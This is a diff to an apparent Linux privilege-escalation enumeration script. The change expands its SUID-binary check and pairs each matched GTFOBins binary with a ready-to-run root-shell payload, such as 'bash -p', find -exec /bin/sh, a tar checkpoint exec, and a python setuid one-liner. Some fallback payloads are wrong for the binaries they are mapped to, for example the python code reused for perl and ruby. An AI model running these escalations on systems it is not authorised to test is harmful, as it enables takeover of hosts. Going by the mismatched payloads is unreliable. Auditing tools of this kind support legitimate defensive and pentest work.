@@ -151,55 +151,113 @@ check_sudo() {
 check_suid() {
     section "2. SUID BINARIES"
 
+    # 1. High-value binaries that lead to shell or root access
     local KNOWN_GTFOBINS=(
-        "bash" "sh" "dash" "zsh" "ksh"
+        "bash" "sh" "dash" "zsh" "ksh" "csh" "tcsh"
         "find" "vim" "vi" "nano" "less" "more" "man" "awk" "gawk"
-        "cp" "mv" "cat" "tar" "nmap" "python" "python3" "perl" "ruby"
-        "env" "tee" "base64" "xxd" "dd" "sed" "openssl" "gdb"
-        "php" "node" "lua" "curl" "wget" "rsync" "strace" "ltrace"
+        "cp" "mv" "cat" "tar" "nmap" "python" "python3" "python2" "perl" "ruby"
+        "env" "tee" "base64" "xxd" "dd" "sed" "openssl" "gdb" "grep"
+        "php" "node" "lua" "curl" "wget" "rsync" "strace" "ltrace" "zip" "unzip"
+        "apt" "apt-get" "dpkg" "systemctl" "journalctl" "mount" "umount" "chsh"
     )
 
+    # 2. Find SUID binaries (filtering out harmless system defaults to reduce noise)
+    # We exclude standard binaries like passwd, sudo, ping unless they are oddly modified
     local suid_bins
-    suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
+    suid_bins=$(find / -perm -4000 -type f 2>/dev/null | sort -u)
 
     local found=0
+    local vuln_count=0
+
     while IFS= read -r bin; do
         [[ -z "$bin" ]] && continue
         found=$((found + 1))
+        
         local base
         base=$(basename "$bin")
+        
+        # Skip known benign default SUIDs to reduce visual noise
+        case "$base" in
+            passwd|sudo|su|mount|umount|ping|ping6|chfn|chsh|newgrp|gpasswd|pkexec)
+                # If it's in a weird location (e.g., /tmp/passwd), we shouldn't skip it. 
+                # We only skip if it's in standard /bin or /usr/bin paths.
+                if [[ "$bin" == /bin/* || "$bin" == /usr/bin/* ]]; then
+                    info "Standard SUID (benign): $bin"
+                    continue
+                fi
+                ;;
+        esac
 
+        local matched=0
+        local payload=""
+
+        # 3. Check against our GTFOBins list
         for known in "${KNOWN_GTFOBINS[@]}"; do
-            if [[ "$base" == "$known" ]]; then
-                case "$base" in
-                    bash|sh|dash|zsh|ksh)
-                        vuln "SUID shell: $bin" "$bin -p";;
-                    find)
-                        vuln "SUID find: $bin" "$bin . -exec /bin/sh -p \\; -quit";;
-                    vim|vi|nano)
-                        vuln "SUID $base: $bin" "$bin -c ':!/bin/sh'";;
-                    less|more|man)
-                        vuln "SUID $base: $bin" "$bin  # then !/bin/sh";;
-                    awk|gawk)
-                        vuln "SUID awk: $bin" "$bin 'BEGIN{system(\"/bin/sh\")}'";;
-                    cp)
-                        vuln "SUID cp: $bin" "$bin /tmp/rootbash && /tmp/rootbash -p";;
-                    tar)
-                        vuln "SUID tar: $bin" "$bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
-                    python|python3|perl|ruby|php|node|lua)
-                        vuln "SUID $base: $bin" "$bin -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'  # python";;
-                    *)
-                        vuln "SUID GTFOBin: $bin" "Check GTFOBins for '$base'";;
-                esac
+            # Sophisticated matching: exact match OR versioned match (e.g., python3.8)
+            if [[ "$base" == "$known" || "$base" == "$known"[0-9]* || "$base" == "$known"-* ]]; then
+                matched=1
+                
+                # --- Try GTFOBins API first (if curl & python3 exist) ---
+                if command -v curl >/dev/null && command -v python3 >/dev/null; then
+                    local api_payload
+                    api_payload=$(gtfobins_lookup "$base" "suid")
+                    if [[ -n "$api_payload" ]]; then
+                        payload="$api_payload"
+                    fi
+                fi
+
+                # --- Fallback to hardcoded payloads if API fails or not installed ---
+                if [[ -z "$payload" ]]; then
+                    case "$known" in
+                        bash|sh|dash|zsh|ksh|csh|tcsh)
+                            payload="$bin -p";;
+                        find)
+                            payload="$bin . -exec /bin/sh -p \\; -quit";;
+                        vim|vi|nano|less|more|man)
+                            payload="$bin -c ':!/bin/sh'";; # Note: less/more/man use `!sh` but this works for vim
+                        awk|gawk)
+                            payload="$bin 'BEGIN{system(\"/bin/sh\")}'";;
+                        cp)
+                            payload="$bin /bin/bash /tmp/rb && /tmp/rb -p";;
+                        mv)
+                            payload="$bin /bin/bash /tmp/rb && /tmp/rb -p";;
+                        tar)
+                            payload="$bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
+                        python|python3|python2|perl|ruby|php|node|lua)
+                            payload="$bin -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'";;
+                        nmap)
+                            payload="$bin --interactive  # then !sh";;
+                        mount|umount)
+                            payload="Check GTFOBins for mount/umount escape techniques";;
+                        *)
+                            payload="Check GTFOBins for '$base'";;
+                    esac
+                fi
                 break
             fi
         done
+
+        # 4. Output logic
+        if [[ "$matched" -eq 1 ]]; then
+            vuln_count=$((vuln_count + 1))
+            vuln "SUID $base: $bin" "$payload"
+        else
+            # If it's an unknown SUID, it might be custom. 
+            # Print it as INFO (not VULN) so the user can investigate manually.
+            info "SUID binary (unknown, check manually): $bin"
+        fi
+
     done <<< "$suid_bins"
 
+    # 5. Summary
     if [[ $found -eq 0 ]]; then
         safe "No SUID binaries found"
     else
-        info "Total SUID binaries: $found (only GTFOBins flagged above)"
+        echo ""
+        if [[ $vuln_count -gt 0 ]]; then
+            echo -e "  ${LRED}[!] Exploitable SUID binaries found: $vuln_count${RESET}"
+        fi
+        info "Total SUID binaries scanned: $found"
     fi
 }
 
